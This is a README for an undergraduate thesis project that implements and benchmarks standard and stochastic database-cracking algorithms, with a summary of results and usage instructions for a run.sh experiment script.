# Thesis: Progressive Index Implementation using Database Cracking Techniques

[download link](https://github.com/nibparanoya52/Progressive-Index-Implementation/releases)


This repository contains the implementation and results of my undergraduate thesis on **Database Cracking** and **Stochastic Database Cracking**, conducted at the Department of Computer Science & Engineering, University of Ioannina.

## 📚 Overview

Modern database systems often face the challenge of optimizing query performance without prior knowledge of the workload. **Database Cracking** is a dynamic indexing approach that reorganizes data incrementally during query processing, avoiding the need for full sorting or static indexing structures.

This thesis investigates both:
- **Standard Database Cracking** methods (Two-Piece Cracking and Three-Piece Cracking) and
- **Stochastic Cracking** methods (DDC, DDR, DD1C, DD1R, MDD1R)

## 🧠 Key Concepts

- **Database Cracking**: Dynamically partitions data columns based on query ranges to optimize future access.
- **Stochastic Cracking**: Enhances standard cracking by introducing randomized reorganization steps to handle non-random or sequential workloads.
- **Progressive Indexing**: Indexes are created and refined as a side effect of query execution.

## 🛠️ Implementation

The system is implemented in a column-oriented manner, inspired by the **MonetDB** architecture. It includes:
- Data structures like **cracker columns** and **AVL-based cracker indexes**.
- **Standard Cracking** algorithms:
  - Two-Piece Cracking
  - Three-Piece Cracking
- **Stochastic Cracking** algorithms:
  - DDC (Data Driven Center)
  - DDR (Data Driven Random)
  - DD1C (Data Driven 1 Center)
  - DD1R (Data Driven 1 Random)
  - MDD1R (Materialization Data Driven 1 Random)

The cracking system supports progressive, adaptive indexing and query processing over synthetic datasets.

## 📊 Experimental Evaluation

Extensive experiments were performed to evaluate:
- **Execution time** of cracking versus full sorting and scanning.
- **Performance of stochastic algorithms** on random vs sequential workloads.

### 🗝 Key Findings:
- Standard cracking performs well on **random workloads**.
- Stochastic variants (especially **MDD1R**) outperform others on **sequential workloads**.
- Database cracking proves to be a **flexible, low-overhead solution** for indexing large data sets.

## 🛠️ Technologies Used

### 💻 Programming Languages
- **C/C++** – Core implementation of cracking algorithms and data structures.
- **Python** – Scripting for experiments and visualization of results.

### 🗄️ Databases & Tools
- **Column-Oriented Storage** – Inspired by systems like **MonetDB** for efficient query execution (theoretically AVL Trees).
- **Map** – Used for implementing the **Cracker Index**. A map offers similar functionality with a binary search tree and we use it because of the built-in functions like insert(), erase() and find() that simplify the manual implementation.
- **Range Queries** – Benchmark queries used to trigger dynamic indexing.

### 🧪 Experimental Environment
- **Linux OS** – Ubuntu used for development and testing.
- **GCC / g++** – Compilers used to build the C/C++ implementation.
- **Shell Scripts** – Used to automate data generation and batch experiments.

## 🚀 How to Run
To run a particular algorithm on a particular dataset, execute:

./run.sh [data] [algo] [nqueries] [workload] [selectivity] [update] [timelimit]
- [data] is one of the following:
  - 100000000.data
  - 100000.data
  - 100.data
  - tyxaia20.data
  - test.data

- [algo] is one of the following:
  - crack
  - sort
  - scan
  - ddc
  - ddr
  - dd1c
  - dd1r
  - mdd1r

- [nqueries] is an integer denoting the number of queries to be executed.

- [workload] is one of the following:
  - Random
  - SeqOver (Sequential)

- [selectivity] is a floating point, e.g.: 1e-2 (means 1% selectivity)

- [update] is NOUP (means No Updates so it only read queries)

- [timelimit] is an integer denoting the maximum runtime in seconds before it is prematurely terminated (if exceeded).

Example run:
./run.sh 100000000.data crack 100000 Random 1e-2 NOUP 30
